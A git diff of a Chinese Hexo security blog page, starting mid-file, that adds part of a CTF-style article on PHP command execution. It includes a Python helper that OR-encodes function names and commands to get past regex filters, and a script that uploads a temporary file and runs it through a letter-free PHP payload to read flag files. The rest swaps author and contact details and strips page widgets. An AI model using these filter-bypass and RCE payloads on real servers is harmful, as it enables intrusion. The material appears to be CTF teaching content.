+<span class="token function">generate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token comment"># author yu22x</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> urllib
+<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> os
+<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
+   s1<span class="token operator">=</span><span class="token string">""</span>
+   s2<span class="token operator">=</span><span class="token string">""</span>
+   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>
+       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"or_rce.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>
+       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>
+               <span class="token keyword">break</span>
+           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>
+               <span class="token comment">#print(i)</span>
+               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>
+               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+               <span class="token keyword">break</span>
+       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>
+   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span>
+   <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2-2-上传临时文件"><a href="#2-2-上传临时文件" class="headerlink" title="2.2.上传临时文件"></a>2.2.上传临时文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding:utf-8</span>
+<span class="token comment">#author yu22x</span>
+<span class="token keyword">import</span> requests
+url<span class="token operator">=</span><span class="token string">"http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;"</span>
+files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'cat f*'</span><span class="token punctuation">}</span>
+response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+html <span class="token operator">=</span> response<span class="token punctuation">.</span>text
+<span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="3-只有4，5个字符命令执行写-反弹shell"><a href="#3-只有4，5个字符命令执行写-反弹shell" class="headerlink" title="3.只有4，5个字符命令执行写/反弹shell"></a>3.只有4，5个字符命令执行写/反弹shell</h2><h2 id="4-利用文件包含"><a href="#4-利用文件包含" class="headerlink" title="4.利用文件包含"></a>4.利用文件包含</h2><p>详见文件包含中的常见操作</p>
 <h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx">https://blog.csdn.net/miuzzx</a></p>
@@ -498,7 +621,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                    <a href="/about" rel="external nofollow noreferrer">outlaws</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -508,7 +631,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://outlaws.top/2021/09/29/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://outlaws.top/2021/09/29/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a>
+                    <a href="https://outlaws.top/2021/09/29/php-dai-ma-ming-ling-zhi-xing/">https://outlaws.top/2021/09/29/php-dai-ma-ming-ling-zhi-xing/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -521,7 +644,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">John Doe</a>
+                    <a href="/about" target="_blank">outlaws</a>
                     !
                 </span>
             </div>
@@ -569,132 +692,6 @@
                 </div>
             </div>
             
-                <style>
-    #reward {
-        margin: 40px 0;
-        text-align: center;
-    }
-
-    #reward .reward-link {
-        font-size: 1.4rem;
-        line-height: 38px;
-    }
-
-    #reward .btn-floating:hover {
-        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
-    }
-
-    #rewardModal {
-        width: 320px;
-        height: 350px;
-    }
-
-    #rewardModal .reward-title {
-        margin: 15px auto;
-        padding-bottom: 5px;
-    }
-
-    #rewardModal .modal-content {
-        padding: 10px;
-    }
-
-    #rewardModal .close {
-        position: absolute;
-        right: 15px;
-        top: 15px;
-        color: rgba(0, 0, 0, 0.5);
-        font-size: 1.3rem;
-        line-height: 20px;
-        cursor: pointer;
-    }
-
-    #rewardModal .close:hover {
-        color: #ef5350;
-        transform: scale(1.3);
-        -moz-transform:scale(1.3);
-        -webkit-transform:scale(1.3);
-        -o-transform:scale(1.3);
-    }
-
-    #rewardModal .reward-tabs {
-        margin: 0 auto;
-        width: 210px;
-    }
-
-    .reward-tabs .tabs {
-        height: 38px;
-        margin: 10px auto;
-        padding-left: 0;
-    }
-
-    .reward-content ul {
-        padding-left: 0 !important;
-    }
-
-    .reward-tabs .tabs .tab {
-        height: 38px;
-        line-height: 38px;
-    }
-
-    .reward-tabs .tab a {
-        color: #fff;
-        background-color: #ccc;
-    }
-
-    .reward-tabs .tab a:hover {
-        background-color: #ccc;
-        color: #fff;
-    }
-
-    .reward-tabs .wechat-tab .active {
-        color: #fff !important;
-        background-color: #22AB38 !important;
-    }
-
-    .reward-tabs .alipay-tab .active {
-        color: #fff !important;
-        background-color: #019FE8 !important;
-    }
-
-    .reward-tabs .reward-img {
-        width: 210px;
-        height: 210px;
-    }
-</style>
-
-<div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
-            
         </div>
     </div>
 
@@ -724,7 +721,7 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2021/09/29/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+                <a href="/2021/09/29/php-dai-ma-ming-ling-zhi-xing/">
                     <div class="card-image">
                         
                         
@@ -746,7 +743,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            outlaws
                             
                         </span>
                     </div>
@@ -770,7 +767,7 @@
                 本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/29/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+                <a href="/2021/09/29/php-dai-ma-ming-ling-zhi-xing/">
                     <div class="card-image">
                         
                         
@@ -792,7 +789,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            outlaws
                             
                         </span>
                     </div>
@@ -998,29 +995,17 @@
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2021</span>
+                <span id="year">2021</span>
             
-            <span id="year">2019</span>
-            <a href="/about" target="_blank">John Doe</a>
+            <span id="year">2021</span>
+            <a href="/about" target="_blank">outlaws</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
             
             
             
-                
             
-            
-                <span id="busuanzi_container_site_pv">
-                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
-                    <span id="busuanzi_value_site_pv" class="white-color"></span>
-            </span>
-            
-            
-                <span id="busuanzi_container_site_uv">
-                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
-                    <span id="busuanzi_value_site_uv" class="white-color"></span>
-            </span>
             
             <br>
 
@@ -1029,14 +1014,14 @@
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/outlaws-bai" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:724958271@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -1046,7 +1031,7 @@
 
 
 
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=724958271" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 724958271" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1205,10 +1190,6 @@ $(function () {
 </script>
 
     
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
